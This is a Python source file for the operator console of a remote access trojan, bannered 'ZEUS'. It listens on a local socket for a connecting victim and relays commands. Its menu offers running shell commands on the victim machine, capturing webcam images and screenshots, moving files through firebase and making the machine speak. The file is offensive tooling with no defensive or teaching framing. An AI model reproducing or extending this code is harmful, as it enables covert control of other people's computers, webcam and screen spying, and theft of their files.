import os
import socket

from colorama import Fore, Back, Style
import time
dog=(Fore.RED+"""
███████╗███████╗██╗   ██╗███████╗
╚══███╔╝██╔════╝██║   ██║██╔════╝
  ███╔╝ █████╗  ██║   ██║███████╗
 ███╔╝  ██╔══╝  ██║   ██║╚════██║
███████╗███████╗╚██████╔╝███████║
╚══════╝╚══════╝ ╚═════╝ ╚══════╝
""")
os.system('cls')
print(Fore.RED+dog)


sock=socket.socket()
sock.bind(("127.0.0.1",9999))
sock.listen(2)
print("Waiting for connection.....")
conn,addr=sock.accept()


print(Fore.GREEN+"Got connection from {}".format(addr[0]))

def printFunction():
    print('''Commands Available
1. display #displays all the commands
2. run <terminal command> #runs terminal command 
3. capture #capture picture through webcam
4. screen capture #screenshot
5. upload <filename> #uploads the file to firebase 
6. download <filename> #downloads file from firebase
7. say <text> #text will be spoken
8. b*tch
    ''')


def get_output():

    while True:
            output=conn.recv(1024).decode()
            print(output)

            if output[-4::]=="d0ne":
                break



while True:
    inp=input(">> ")
    if inp=="quit":
        sock.close()
        break
    elif inp=="clear":
        os.system('clear')
        print(dog)
        print(Fore.GREEN)
    elif inp=="display":
        printFunction()
        print(Fore.GREEN)
    else:
        conn.send(inp.encode())
        output=get_output()
